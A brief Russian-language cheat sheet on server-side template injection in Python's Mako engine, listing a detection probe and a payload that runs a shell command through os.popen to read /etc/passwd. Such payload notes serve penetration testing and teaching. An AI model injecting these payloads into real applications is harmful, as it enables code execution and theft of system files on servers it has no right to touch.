# SSTI (Server-Side Template Injection) в Python

##  Mako Templates
### Проверка уязвимости
${7*7}  # → 49

### Чтение файла
<% import os %>${os.popen('cat /etc/passwd').read()}
